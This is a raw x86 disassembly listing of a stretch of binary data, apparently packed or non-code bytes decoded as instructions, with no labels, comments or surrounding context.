  41343a:	pop    ss
  41343b:	and    BYTE PTR [eax],ch
  41343d:	js     0x413498
  41343f:	xor    BYTE PTR [ebx+0x65546a9e],0x14
  413446:	and    ah,0xaa
  413449:	xor    bh,ch
  41344b:	leave  
  41344c:	sbb    BYTE PTR [ebp+0x9],bh
  41344f:	dec    esi
  413450:	add    dh,ch
  413452:	sbb    eax,0x1157ea5f
  413457:	sbb    eax,0xd41eb49a
  41345c:	inc    ebp
  41345d:	bound  edi,QWORD PTR [ebx]
  41345f:	and    DWORD PTR [esi+eax*2],ebp
  413462:	dec    esi
  413463:	mov    eax,0xdf925365
  413468:	aaa    
  413469:	and    bh,BYTE PTR [ebx+0x22]
  41346c:	cld    
  41346d:	mov    esp,0xccbf009b
  413472:	xor    eax,0x9fb41beb
  413477:	cmp    ecx,DWORD PTR fs:[edx+0x59]
  41347b:	cmp    eax,0x3245c08c
  413480:	rcr    dh,1
  413482:	jmp    0x388a26b5
  413487:	lods   al,BYTE PTR ds:[esi]
  413488:	dec    edi
  413489:	in     al,dx
  41348a:	sbb    bl,ah
  41348c:	sar    BYTE PTR [esi],cl
  41348e:	jae    0x413480
  413490:	retf   
  413491:	sub    al,BYTE PTR [eax]
  413493:	add    esp,DWORD PTR [ebp+0x13]
  413496:	mov    al,ds:0xf5724824
  41349b:	pusha  
  41349c:	fidivr DWORD PTR [ebx+edi*8-0x1d2672d]
  4134a3:	ret    
  4134a4:	les    ecx,FWORD PTR [ecx]
  4134a6:	or     DWORD PTR [edi-0x39],0x41
  4134aa:	pushf  
  4134ab:	sub    al,0xa3
  4134ad:	les    esp,FWORD PTR [ecx+0x73]
  4134b0:	push   cs
  4134b1:	dec    ebx
  4134b2:	cmp    dh,BYTE PTR [edx-0x1]
  4134b5:	outs   dx,BYTE PTR ds:[esi]
  4134b6:	and    al,ah
  4134b8:	rcr    BYTE PTR [edx+0x6088d73d],cl
  4134be:	imul   ecx,DWORD PTR [edi-0x3],0x91ebed72
  4134c5:	sub    eax,0x1bcb5157
  4134ca:	push   ebp
  4134cb:	nop
  4134cc:	sub    al,0x9b
  4134ce:	popf   
  4134cf:	out    dx,al
  4134d0:	add    esi,DWORD PTR [eax-0x782f778e]
  4134d6:	call   0x890d:0x98597b0d
  4134dd:	sbb    BYTE PTR [edi+ebp*2],dh
  4134e0:	ss inc ebx
  4134e2:	inc    ebx
  4134e3:	inc    ebp
  4134e4:	fadd   st,st(0)
  4134e6:	enter  0x8d90,0x8
  4134ea:	lea    edi,[ebx-0x78]
  4134ed:	rol    BYTE PTR [esi],1
  4134ef:	stos   DWORD PTR es:[edi],eax
  4134f0:	std    
  4134f1:	xchg   BYTE PTR [edx-0x35],ah
  4134f4:	ins    BYTE PTR es:[edi],dx
  4134f5:	cdq    
  4134f6:	out    dx,eax
  4134f7:	pop    ecx
  4134f8:	hlt    
  4134f9:	push   edx
  4134fa:	out    0x52,al
  4134fc:	pop    esp
  4134fd:	shl    BYTE PTR [edx-0x70],0xc0
  413501:	adc    DWORD PTR [ebp+0x68],esi
  413504:	xor    al,0xeb
  413506:	aad    0x98
  413508:	mov    ch,0xa3
  41350a:	push   eax
  41350b:	imul   ebp,DWORD PTR ds:0x33c9c73e,0xffffffca
  413512:	mov    DWORD PTR [ebp+0x5064e9a4],edi
  413518:	pop    ds
  413519:	mov    esi,0xe139f04f
  41351e:	lds    ebx,FWORD PTR [ebx+ecx*8+0x3]
  413522:	cmp    eax,0x3bfdfab1
  413527:	(bad)  
  41352a:	cdq    
  41352b:	pop    eax
  41352c:	mov    cl,0x4a
  41352e:	sbb    esi,DWORD PTR [eax]
  413530:	test   BYTE PTR [edx+0x75],dl
  413533:	xor    BYTE PTR [edi+0x45],ch
  413536:	lock pushf 
  413538:	sub    edi,edx
  41353a:	inc    esp
  41353b:	les    eax,FWORD PTR [ebx+0x2f]
  41353e:	rcr    BYTE PTR [eax-0x5d],0x67
  413542:	or     DWORD PTR [esp+eax*8+0x614808ee],esp
  413549:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41354a:	sbb    BYTE PTR [eax+0x0],dl
  41354d:	mov    edi,0x7f7ed796
  413552:	adc    dh,BYTE PTR [eax-0x5d]
  413555:	ja     0x413561
  413557:	pop    ecx
  413558:	push   ecx
  413559:	(bad)  
  41355a:	xchg   esi,eax
  41355b:	jmp    0xc0a11c2f
  413560:	shl    DWORD PTR [ebx],cl
  413562:	inc    esi
  413563:	xchg   esi,eax
  413564:	sti    
  413565:	push   ebx
  413566:	clc    
  413567:	shl    BYTE PTR [esp+ebp*4],cl
  41356a:	cli    
  41356b:	sub    DWORD PTR [ecx+0x4e41f175],edx
  413571:	push   esi
  413572:	adc    BYTE PTR [ebx+0x68],bl
  413575:	into   
  413576:	cmp    al,BYTE PTR [edx-0x45ed04a0]
  41357c:	das    
  41357d:	in     eax,0xf3
  41357f:	lahf   
  413580:	xor    ecx,DWORD PTR [edx+0x1a52294d]
  413586:	sti    
  413587:	sub    DWORD PTR [eax],esp
  413589:	jge    0x4135f3
  41358b:	ins    DWORD PTR es:[edi],dx
  41358c:	(bad)  
  41358d:	pop    esi
  41358e:	cli    
  41358f:	mov    BYTE PTR [edi],dl
  413591:	out    0x27,eax
  413593:	jge    0x41359b
  413595:	es scas al,BYTE PTR es:[edi]
  413597:	dec    ebp
  413598:	or     ch,BYTE PTR [edi]
  41359a:	sub    DWORD PTR [esi-0x5c78973],0xfffffff7
  4135a1:	mov    eax,ds:0x7410be53
  4135a6:	add    ebx,0xde2e3fd2
  4135ac:	sti    
  4135ad:	fucomi st,st(1)
  4135af:	(bad)  
  4135b0:	and    DWORD PTR [ebp-0x57],esp
  4135b3:	ins    BYTE PTR es:[edi],dx
  4135b4:	xchg   edi,eax
  4135b5:	push   ebp
  4135b6:	sub    eax,0x8d54f26c
  4135bb:	push   ebx
  4135bc:	fidiv  DWORD PTR [edi]
  4135be:	mov    esi,0x8c6f9155
  4135c3:	jb     0x413599
  4135c5:	cmp    DWORD PTR [eax],0xe6b2ffd4
  4135cb:	mov    esi,0x676fabc6
  4135d0:	mov    ebx,0x1b5fc52
  4135d5:	mov    edi,0x19e0abfc
  4135da:	inc    esp
  4135db:	lods   al,BYTE PTR ds:[esi]
  4135dc:	or     DWORD PTR [edx-0x5c],0xb06e618b
  4135e3:	inc    ecx
  4135e4:	retf   0x383a
  4135e7:	mov    gs,ebp
  4135e9:	or     DWORD PTR [eax],edi
  4135eb:	fidiv  WORD PTR [edx]
  4135ed:	out    dx,al
  4135ee:	and    DWORD PTR [edi-0x2],eax
  4135f1:	cs sbb al,0x66
  4135f4:	mov    ds:0x4ca28549,al
  4135f9:	ss dec ecx
  4135fb:	mov    edi,edi
  4135fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135fe:	(bad)  
  4135ff:	mov    al,ds:0x4aa4f448
  413604:	icebp  
  413605:	jmp    0xcb9936ef
  41360a:	mov    cl,0xaf
  41360c:	loope  0x4135c2
  41360e:	in     al,dx
  41360f:	lock daa 
  413611:	pop    esp
  413612:	dec    esp
  413613:	nop
  413614:	hlt    
  413615:	loopne 0x4135be
  413617:	add    DWORD PTR [edi+0x694bccd3],ebx
  41361d:	leave  
  41361e:	test   eax,0x6c8fb495
  413623:	add    dh,bl
  413625:	dec    ebp
  413626:	jns    0x4135fb
  413628:	xchg   esp,eax
  413629:	and    ch,BYTE PTR [edx+0x601af2bb]
  41362f:	lea    edx,[ebx+0x3aba4044]
  413635:	jmp    0xef8d:0x4802ad0a
  41363c:	jp     0x4135e2
  41363e:	adc    al,0xff
  413640:	push   ebp
  413641:	jge    0x41360e
  413643:	jo     0x4135ee
  413645:	test   BYTE PTR [esp+edx*8],0xe8
  413649:	sub    al,0xe1
  41364b:	push   ebp
  41364c:	cs xchg edi,eax
  41364e:	xor    al,0x12
  413650:	sahf   
  413651:	xor    eax,0x95b22017
  413656:	add    BYTE PTR [eax-0x23],0x8f
  41365a:	aaa    
  41365b:	scas   al,BYTE PTR es:[edi]
  41365c:	push   DWORD PTR [ecx-0x10]
  41365f:	ins    BYTE PTR es:[edi],dx
  413660:	fwait
  413661:	mov    edi,0x2eed19fc
  413666:	and    eax,0x6088cf90
  41366b:	fimul  WORD PTR [ebx-0x55]
  41366e:	push   ss
  41366f:	call   0xeb2da88
  413674:	dec    eax
  413675:	ret    
  413676:	adc    eax,ebp
  413678:	sub    DWORD PTR [ebx+eiz*4],edx
  41367b:	cmp    al,bl
  41367d:	dec    ebx
  41367e:	daa    
  41367f:	and    edx,esi
  413681:	mov    eax,0x3131faf3
  413686:	repz mov WORD PTR [ecx],cs
  413689:	xchg   edx,eax
  41368a:	fwait
  41368b:	sub    DWORD PTR [ebx+edx*8],ebx
  41368e:	js     0x413668
  413690:	int3   
  413691:	test   ebx,esp
  413693:	lds    esi,FWORD PTR [ebp+0x5]
  413696:	pop    esp
  413697:	inc    ebp
  413698:	lods   al,BYTE PTR ds:[esi]
  413699:	jle    0x413642
  41369b:	pop    ds
  41369c:	and    BYTE PTR [eax+0x3e],bh
  41369f:	or     DWORD PTR [ecx-0x6e],ebp
  4136a2:	test   al,0xca
  4136a4:	pop    ds
  4136a5:	cmp    al,0xe5
  4136a7:	stos   BYTE PTR es:[edi],al
  4136a8:	fs neg bl
  4136ab:	in     al,0xd6
  4136ad:	add    BYTE PTR ds:0xd2ff23c2,cl
  4136b3:	inc    ecx
  4136b4:	call   0xb5f47c15
  4136b9:	and    ebp,edi
  4136bb:	or     esi,ebp
  4136bd:	or     al,0x3d
  4136bf:	sbb    esi,DWORD PTR [ebx-0x6179a8bc]
  4136c5:	mov    ebx,0xd2e86a67
  4136ca:	outs   dx,DWORD PTR ds:[esi]
  4136cb:	out    dx,eax
  4136cc:	shr    BYTE PTR [eax+0x2cc462f7],1
  4136d2:	pushf  
  4136d3:	iret   
  4136d4:	xchg   edi,eax
  4136d5:	inc    ebp
  4136d6:	sub    BYTE PTR [ecx+0x225e2a26],bh
  4136dc:	stos   DWORD PTR es:[edi],eax
  4136dd:	test   DWORD PTR [ebx],esi
  4136df:	xchg   BYTE PTR [edx],cl
  4136e1:	clc    
  4136e2:	ins    DWORD PTR es:[edi],dx
  4136e3:	cmp    bh,BYTE PTR [edi-0x7b]
  4136e6:	ins    BYTE PTR es:[edi],dx
  4136e7:	push   0xe
  4136e9:	xchg   ebp,eax
  4136ea:	loope  0x41371b
  4136ec:	iret   
  4136ed:	mov    esp,0xb9282497
  4136f2:	xchg   ecx,eax
  4136f3:	cli    
  4136f4:	and    BYTE PTR [eax],dh
  4136f6:	sbb    eax,0xdbf41463
  4136fb:	aas    
  4136fc:	sbb    DWORD PTR [eax+0x74],ecx
  4136ff:	inc    ebx
  413700:	(bad)  
  413701:	in     eax,dx
  413702:	inc    ebx
  413703:	mov    esp,0xca2233e7
  413708:	dec    ebx
  413709:	jmp    0x70ec088d
  41370e:	pop    ecx
  41370f:	and    BYTE PTR ds:0x25a7c28b,bh
  413715:	jg     0x4136c7
  413717:	fwait
  413718:	mov    ebx,DWORD PTR [ecx]
  41371a:	pusha  
  41371b:	sub    eax,0x69b7a090
  413720:	retf   
  413721:	bound  esp,QWORD PTR [ebp+0x58ae7eb2]
  413727:	pop    ss
  413728:	aad    0x8f
  41372a:	shl    DWORD PTR [edx-0x7a],0x38
  41372e:	add    ecx,esp
  413730:	pop    edx
  413731:	xchg   ebp,eax
  413732:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413733:	mov    ss,WORD PTR [ebx+esi*2]
  413736:	enter  0xb357,0x50
  41373a:	ror    DWORD PTR [ecx+eiz*8],cl
  41373d:	inc    esi
  41373e:	adc    dh,BYTE PTR ds:0x29871980
  413744:	js     0x4137b5
  413746:	push   edx
  413747:	push   edx
  413748:	popf   
  413749:	xchg   ecx,eax
  41374a:	xlat   BYTE PTR ds:[ebx]
  41374b:	daa    
  41374c:	and    BYTE PTR [edi+0x3e59b17a],bl
  413752:	or     bl,BYTE PTR [ecx+eax*2+0x1e484be]
  413759:	sub    al,0x7b
  41375b:	in     al,dx
  41375c:	test   DWORD PTR [ebx],ebx
  41375e:	push   eax
  41375f:	shl    DWORD PTR [esi],1
  413761:	mov    ecx,edx
  413763:	xchg   esi,eax
  413764:	jl     0x413743
  413766:	aaa    
  413767:	push   es
  413768:	dec    esp
  413769:	or     BYTE PTR [ebx],0xfc
  41376c:	cmp    ebp,DWORD PTR [esi+ecx*4+0x1b]
  413770:	jge    0x41375f
  413772:	f2xm1  
  413774:	in     eax,dx
  413775:	div    BYTE PTR [esi+ebx*8-0x55]
  413779:	(bad)  
  41377a:	xor    eax,0xb5100d4b
  41377f:	repz cld 
  413781:	aad    0x61
  413783:	retf   
  413784:	mov    ebp,0x2ee30b91
  413789:	sahf   
  41378a:	fsubr  DWORD PTR [ecx]
  41378c:	jb     0x413794
  41378e:	push   edx
  41378f:	icebp  
  413790:	pop    ebx
  413791:	xchg   DWORD PTR [ecx+0xc],esi
  413794:	push   ecx
  413795:	scas   al,BYTE PTR es:[edi]
  413796:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413797:	popa   
  413798:	imul   ebp,DWORD PTR [ebx+0x71],0xff8c4479
  41379f:	jae    0x41380f
  4137a1:	sar    DWORD PTR [esi],1
  4137a3:	pop    esp
  4137a4:	cmp    al,BYTE PTR [ebx]
  4137a6:	jge    0x413815
  4137a8:	and    esp,DWORD PTR [edx]
  4137aa:	cmp    al,0x5
  4137ac:	fcmovb st,st(2)
  4137ae:	vshufps ymm5,ymm7,YMMWORD PTR [eax-0xcf42ca5],0x92
  4137b7:	and    dh,bl
  4137b9:	xlat   BYTE PTR ds:[ebx]
  4137ba:	jne    0x413806
  4137bc:	fnsave [ecx]
  4137be:	das    
  4137bf:	add    dl,BYTE PTR [edx-0x36]
  4137c2:	dec    ecx
  4137c3:	loopne 0x4137be
  4137c5:	imul   ecx,ebp,0xffffff9b
  4137c8:	loop   0x41381f
  4137ca:	fwait
  4137cb:	test   al,0xe5
  4137cd:	sahf   
  4137ce:	dec    esi
  4137cf:	int    0x75
  4137d1:	push   esp
  4137d2:	cmovns edx,DWORD PTR [esi]
  4137d5:	outs   dx,BYTE PTR ds:[esi]
  4137d6:	and    eax,0xbcc87504
  4137db:	in     al,0x2a
  4137dd:	stos   DWORD PTR es:[edi],eax
  4137de:	scas   al,BYTE PTR es:[edi]
  4137df:	mov    dh,0xf7
  4137e1:	imul   eax,DWORD PTR [edi],0x46e5ce6b
  4137e7:	retf   
  4137e8:	push   edi
  4137e9:	div    BYTE PTR [edi]
  4137eb:	ret    0x5b3c
  4137ee:	jne    0x4137d4
  4137f0:	inc    ecx
  4137f1:	push   cs
  4137f2:	ds mov eax,0x64a6882e
  4137f8:	push   edi
  4137f9:	hlt    
  4137fa:	test   eax,0xff6cbe58
  4137ff:	mov    ebx,0xa382982c
  413804:	enter  0x231,0x35
  413808:	addr16 push ecx
  41380a:	mov    es,WORD PTR [ebx+0xfb2c0ed]
  413810:	(bad)  
  413811:	fcmove st,st(3)
  413813:	add    BYTE PTR cs:[eax-0x2f5d07ad],dl
  41381a:	pop    esp
  41381b:	mov    al,0xc5
  41381d:	mov    ds:0xe82f99fa,al
  413822:	mov    edi,0xc6da3908
  413827:	fldenv [edi+0x528ee73f]
  41382d:	jbe    0x4137b2
  41382f:	inc    ecx
  413830:	mov    bp,WORD PTR [ebp+esi*4+0x740ae314]
  413838:	je     0x41383f
  41383a:	or     al,0x9
  41383d:	push   esp
  41383e:	push   es
  41383f:	push   ebx
  413840:	sub    DWORD PTR [ebp+0x54],ebx
  413843:	push   edi
  413844:	jmp    0xd29a:0xecdd5e2b
  41384b:	test   eax,0xb83bef
  413850:	lods   al,BYTE PTR ds:[esi]
  413851:	cld    
  413852:	mov    BYTE PTR [ebp+0x7],al
  413855:	cmp    BYTE PTR [edx-0x48],0x1a
  413859:	mov    esi,0xb1cb1a81
  41385e:	mov    esi,0x9db30e22
  413863:	and    BYTE PTR [esi+ecx*1],0xdd
  413867:	push   eax
  413868:	div    BYTE PTR [esi+0xa107994]
  41386e:	call   0xbc2:0x99e805c2
  413875:	shl    DWORD PTR [ebx],cl
  413877:	xchg   edx,eax
  413878:	rcl    BYTE PTR [eax-0x2efa1ba1],cl
  41387e:	jmp    0x413803
  413880:	or     DWORD PTR [eax],ebx
  413882:	mov    ch,0x27
  413884:	push   0x6c
  413886:	cmp    eax,0x44a9c90b
  41388b:	cld    
  41388c:	push   ecx
  41388d:	mov    bl,BYTE PTR [ebx]
  41388f:	adc    eax,0xeafb5de9
  413894:	and    eax,0xaebc5a60
  413899:	xor    BYTE PTR [edi-0x6a],bl
  41389c:	mov    eax,ds:0x3df60d0d
  4138a1:	mov    edx,0x2a593009
  4138a6:	and    BYTE PTR [ecx],bh
  4138a8:	int    0x1d
  4138aa:	daa    
  4138ab:	loope  0x413910
  4138ad:	pop    es
  4138ae:	loop   0x4138a8
  4138b0:	daa    
  4138b1:	sbb    dh,BYTE PTR [eax+0x3]
  4138b4:	mul    DWORD PTR [eax-0x538efa41]
  4138ba:	add    BYTE PTR es:[esi+0x1a],ch
  4138be:	jmp    0xcdbb:0xa10b7b73
  4138c5:	mov    edi,0x6b7b8ee1
  4138ca:	scas   al,BYTE PTR es:[edi]
  4138cb:	cs push eax
  4138cd:	outs   dx,DWORD PTR ds:[esi]
  4138ce:	adc    cl,BYTE PTR ds:0x13b41242
  4138d4:	add    eax,0x8a48ee85
  4138d9:	repnz pop eax
  4138db:	lods   eax,DWORD PTR ds:[esi]
  4138dc:	xchg   edi,eax
  4138dd:	xchg   DWORD PTR [ebx+0x8122c85],ebx
  4138e3:	jmp    0x5e8ddff9
  4138e8:	int3   
  4138e9:	out    0x13,al
  4138eb:	ret    0xe306
  4138ee:	outs   dx,BYTE PTR ds:[esi]
  4138ef:	pop    ecx
  4138f0:	jl     0x4138b7
  4138f2:	fcmovbe st,st(0)
  4138f4:	add    esi,DWORD PTR [eax+0x57]
  4138f7:	fnstcw WORD PTR [esi+0x42]
  4138fa:	cwde   
  4138fb:	mov    ah,0x2f
  4138fd:	mov    esi,0xe2f52533
  413902:	inc    ecx
  413903:	cdq    
  413904:	mov    dh,0x73
  413906:	bound  esi,QWORD PTR [ebp+0x38fea1d8]
  41390c:	mov    dh,0xf4
  41390e:	sbb    al,0xa9
  413910:	mov    dh,0x42
  413912:	xchg   eax,edi
  413914:	cld    
  413915:	add    BYTE PTR [esi+0x46],bl
  413918:	lock call 0xfd94c5bd
  41391e:	push   esp
  41391f:	mov    ds:0xa66b8278,al
  413924:	mov    bl,0x73
  413926:	and    BYTE PTR [eax+ebx*4+0x7a3c061e],0x1a
  41392e:	ror    BYTE PTR [edi+0x5a25ff33],0xeb
  413935:	fisubr WORD PTR [ecx-0x3d292de2]
  41393b:	lahf   
  41393c:	push   es
  41393d:	pushf  
  41393e:	retf   
  41393f:	cdq    
  413940:	cs popa 
  413942:	xchg   edi,eax
  413943:	std    
  413944:	or     eax,0x2fca671
  413949:	mov    al,ds:0xfce9e383
  41394e:	das    
  41394f:	cmovae esi,DWORD PTR [edx+0x9]
  413953:	rcl    DWORD PTR [ecx+0x66b66458],0xbf
  41395a:	in     eax,dx
  41395b:	mov    al,0x7b
  41395d:	jle    0x413995
  41395f:	jo     0x413936
  413961:	stos   BYTE PTR es:[edi],al
  413962:	jmp    0x4138f7
  413964:	cmp    cl,BYTE PTR [edi+0x5a]
  413967:	test   eax,0x9c3decec
  41396c:	sbb    al,0x8a
  41396e:	je     0x413952
  413970:	lods   al,BYTE PTR ds:[esi]
  413971:	jb     0x4139bd
  413973:	cmp    al,0xce
  413975:	jns    0x4139c7
  413977:	into   
  413978:	loopne 0x4139eb
  41397a:	hlt    
  41397b:	mov    eax,ds:0x7e84ede7
  413980:	int3   
  413981:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413982:	sub    al,0xb5
  413984:	lock test BYTE PTR [edx+0x39],0xb3
  413989:	(bad)  
  41398a:	adc    DWORD PTR [ecx],edi
  41398c:	jmp    0x4139ee
  41398e:	mov    bh,0xd3
  413990:	fdiv   QWORD PTR [edi]
  413992:	fimul  DWORD PTR [eax]
  413994:	lock xchg ebp,eax
  413996:	lea    ebp,[esi+esi*4]
  413999:	push   es
  41399a:	sub    eax,0xb49eee3c
  41399f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139a0:	ror    BYTE PTR [ebp-0x700cbbe7],cl
  4139a6:	dec    edx
  4139a7:	stos   BYTE PTR es:[edi],al
  4139a8:	stos   DWORD PTR es:[edi],eax
  4139a9:	cli    
  4139aa:	outs   dx,DWORD PTR ds:[esi]
  4139ab:	lods   eax,DWORD PTR ds:[si]
  4139ad:	ds aam 0x0
  4139b0:	fsub   QWORD PTR [edi-0x5e]
  4139b3:	fdiv   st,st(3)
  4139b5:	rcl    BYTE PTR [ecx-0x17d3f779],0xa3
  4139bc:	jmp    0x38b2:0x22fccc39
  4139c3:	hlt    
  4139c4:	pop    ss
  4139c5:	popf   
  4139c6:	stos   BYTE PTR es:[edi],al
  4139c7:	push   0x66
  4139c9:	push   ebp
  4139ca:	cmp    DWORD PTR ds:0xa949b059,esi
  4139d0:	push   ecx
  4139d1:	fwait
  4139d2:	inc    ebx
  4139d3:	es (bad) 
  4139d5:	or     al,0x48
  4139d7:	or     bh,BYTE PTR [eax+ecx*2-0x2ba5fe44]
  4139de:	sub    ah,BYTE PTR [ebx-0x79]
  4139e1:	repnz mov esp,0x20af624d
  4139e7:	mov    ebp,0xacb61542
  4139ec:	or     bh,al
  4139ee:	mov    bh,0x1
  4139f0:	not    BYTE PTR [edx-0x79]
  4139f3:	and    DWORD PTR [ecx],edi
  4139f5:	retf   0x84ac
  4139f8:	sub    BYTE PTR [ecx-0x10],0x86
  4139fc:	mov    ds:0x150aab6a,al
  413a01:	inc    esp
  413a02:	jne    0x4139ab
  413a04:	ret    
  413a05:	push   ebp
  413a06:	iret   
  413a07:	dec    ebp
  413a08:	adc    ebx,eax
  413a0a:	and    BYTE PTR [edx+0x7b],cl
  413a0d:	scas   al,BYTE PTR es:[edi]
  413a0e:	data16 cli 
  413a10:	scas   al,BYTE PTR es:[edi]
  413a11:	jbe    0x413a49
  413a13:	jmp    0xfd14:0x285cd0c4
  413a1a:	adc    BYTE PTR [ebx+0x3ec3e621],bl
  413a20:	mov    esi,0x711e9c28
  413a25:	in     al,0xa8
  413a27:	out    dx,eax
  413a28:	adc    al,0xf8
  413a2a:	inc    edi
  413a2b:	mov    BYTE PTR [eax+0x2e25c8a1],ch
  413a31:	mov    eax,0xd77b8873
  413a36:	daa    
  413a37:	cld    
  413a38:	sub    DWORD PTR [ebx-0x40c5096f],ebx
  413a3e:	jp     0x413a94
  413a40:	push   ecx
  413a41:	mov    eax,0xe7e9b722
  413a46:	push   esi
  413a47:	xor    DWORD PTR [ebx+0x59aa7961],esi
  413a4d:	push   ss
  413a4e:	cwde   
  413a4f:	mov    cl,0xa
  413a51:	jmp    0x413a3d
  413a53:	cmp    esp,DWORD PTR [edx+0x4a]
  413a56:	jmp    0x413ad0
  413a58:	adc    al,0xf1
  413a5a:	idiv   BYTE PTR [edx+0x5b0fb3e0]
  413a60:	inc    ebx
  413a61:	adc    DWORD PTR [esi+0x53],esp
  413a64:	mov    bl,BYTE PTR [esi-0x6b]
  413a67:	fwait
  413a68:	mov    ecx,0xe9c54568
  413a6d:	js     0x413a00
  413a6f:	scas   eax,DWORD PTR es:[edi]
  413a70:	jmp    0xe527ea1
  413a75:	or     eax,DWORD PTR [edi]
  413a77:	add    ch,BYTE PTR [ecx-0x7b7326f0]
  413a7d:	adc    esi,DWORD PTR [edx+eax*2-0x76]
  413a81:	fimul  WORD PTR [ecx]
  413a83:	fsub   QWORD PTR [eax+0x49d9ee2c]
  413a89:	add    edi,ebx
  413a8b:	and    al,0x9f
  413a8d:	dec    DWORD PTR [esi-0x7b873587]
  413a93:	mov    BYTE PTR [esi-0x37],dh
  413a96:	push   ecx
  413a97:	bound  ecx,QWORD PTR [ebx]
  413a99:	or     esp,esi
  413a9b:	jmp    0xe393:0x515f2c0c
  413aa2:	sub    al,dl
  413aa4:	sbb    BYTE PTR [edx-0xb],0x80
  413aa8:	and    BYTE PTR [edi-0x58],0xdc
  413aac:	xchg   ebp,eax
  413aad:	arpl   bp,bx
  413aaf:	push   edx
  413ab0:	into   
  413ab1:	lds    eax,FWORD PTR [ebx+0x6d]
  413ab4:	jge    0x413a53
  413ab6:	mov    ecx,0xc5e40035
  413abb:	pop    ds
  413abc:	xor    al,0x4d
  413abe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413abf:	ror    DWORD PTR ds:0xc19b621,1
  413ac5:	dec    esi
  413ac6:	jae    0x413b28
  413ac8:	adc    ecx,esp
  413aca:	push   cs
  413acb:	es popf 
  413acd:	jmp    0x413b3d
  413acf:	xor    esi,esi
  413ad1:	cli    
  413ad2:	xchg   ecx,eax
  413ad3:	sub    BYTE PTR [ecx-0x60],0xfb
  413ad7:	or     eax,0xe753d722
  413adc:	push   esp
  413add:	test   edi,ebx
  413adf:	fs ds inc ecx
  413ae2:	mov    edx,edi
  413ae4:	cmc    
  413ae5:	mov    eax,ecx
  413ae7:	mov    ds:0x6ea5b84,eax
  413aec:	neg    DWORD PTR [eax+0x7]
  413aef:	sbb    ebx,ecx
  413af1:	or     eax,0xcf907648
  413af6:	inc    ebx
  413af7:	sahf   
  413af8:	arpl   bp,cx
  413afa:	ins    DWORD PTR es:[edi],dx
  413afb:	xchg   esi,eax
  413afc:	leave  
  413afd:	adc    edi,esp
  413aff:	enter  0xf3a6,0x7
  413b03:	sub    esi,DWORD PTR [eax-0x48]
  413b06:	pop    ebx
  413b07:	(bad)  ds:0x3185ef4e
  413b0d:	shl    DWORD PTR [edx],0xc8
  413b10:	dec    DWORD PTR [esi]
  413b12:	push   esp
  413b13:	popf   
  413b14:	dec    ecx
  413b15:	int    0x72
  413b17:	or     esi,ecx
  413b19:	in     al,0x7b
  413b1b:	xchg   esi,eax
  413b1c:	jae    0x413b1b
  413b1e:	int3   
  413b1f:	inc    esi
  413b20:	gs sub eax,0x30db7bd6
  413b26:	sbb    bh,BYTE PTR ds:0x7064a00d
  413b2c:	mov    BYTE PTR [ebp+eiz*1+0x2d],al
  413b30:	pop    ecx
  413b31:	cmp    esi,esp
  413b33:	scas   al,BYTE PTR es:[edi]
  413b34:	adc    edi,DWORD PTR [edx+0x6363bc97]
  413b3a:	and    eax,0xb5facef4
  413b3f:	lock mov esi,0x7fff5446
  413b45:	xor    ecx,DWORD PTR [ebp+0x7e793c5b]
  413b4b:	out    0xd4,eax
  413b4d:	cmp    al,0x90
  413b4f:	ror    DWORD PTR [ecx+0x16],0x86
  413b53:	push   eax
  413b54:	or     eax,0x4bbe056
  413b59:	push   eax
  413b5a:	pusha  
  413b5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b5c:	je     0x413ba1
  413b5e:	loopne 0x413bc3
  413b60:	sub    DWORD PTR [ecx+0xdd0f16f],ebx
  413b66:	push   ebp
  413b67:	dec    eax
  413b68:	jae    0x413b23
  413b6a:	mov    ds:0xc7bc0911,al
  413b6f:	dec    esp
  413b70:	mov    esi,0xc00b3fb8
  413b75:	sub    ch,ch
  413b77:	cwde   
  413b78:	mov    bh,0x3a
  413b7a:	and    BYTE PTR [edx+ebx*4-0x2e],0x2
  413b7f:	lds    sp,DWORD PTR [edi-0xc]
  413b83:	inc    edi
  413b84:	cmp    eax,0x9d16949e
  413b89:	xor    al,0x64
  413b8b:	rcl    DWORD PTR ds:0xd18e5a16,1
  413b91:	leave  
  413b92:	cli    
  413b93:	fimul  WORD PTR [edx+0x5311aefa]
  413b99:	daa    
  413b9a:	loop   0x413b8c
  413b9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b9d:	pop    ebx
  413b9e:	(bad)  
  413b9f:	mov    ebp,0xe3c54177
  413ba4:	test   DWORD PTR [ecx],eax
  413ba6:	mov    WORD PTR [edx+edi*4],cs
  413ba9:	jno    0x413c07
  413bab:	add    BYTE PTR [eax],0x1b
  413bae:	xchg   edi,eax
  413baf:	fs je  0x413bea
  413bb2:	pushf  
  413bb3:	push   ebp
  413bb4:	xor    esi,0xffffff8f
  413bb7:	mov    BYTE PTR [esi+0xa],bl
  413bba:	out    dx,al
  413bbb:	pop    eax
  413bbc:	les    eax,FWORD PTR [ebx+0x453fda35]
  413bc2:	mov    edi,0x46e395ee
  413bc7:	inc    edi
  413bc8:	xchg   BYTE PTR [edi+0x1b],ah
  413bcb:	loop   0x413b59
  413bcd:	jmp    0x8e54:0x872aeaf5
  413bd4:	mov    ecx,0x1d70ed08
  413bd9:	fistp  DWORD PTR [esi-0x2e]
  413bdc:	in     al,0xa3
  413bde:	(bad)  
  413bdf:	mov    eax,0xd19f45a6
  413be4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413be5:	daa    
  413be6:	dec    edx
  413be7:	mov    esi,0xa927704e
  413bec:	dec    edx
  413bed:	cmp    DWORD PTR [esi-0x65bfa79],edi
  413bf3:	daa    
  413bf4:	test   al,0x23
  413bf6:	out    dx,al
  413bf7:	jmp    0xd6bb:0x2f1d216e
  413bfe:	xchg   ecx,eax
  413bff:	js     0x413c1e
  413c01:	mov    ecx,0xe4ecbd6a
  413c06:	adc    BYTE PTR [edx-0x2a54e7a1],cl
  413c0c:	sbb    DWORD PTR [esp+ebp*2],esp
  413c0f:	xchg   ebx,eax
  413c10:	lea    ebx,[ecx-0x19]
  413c13:	adc    DWORD PTR [eax+0x562cc47d],ebp
  413c19:	pushf  
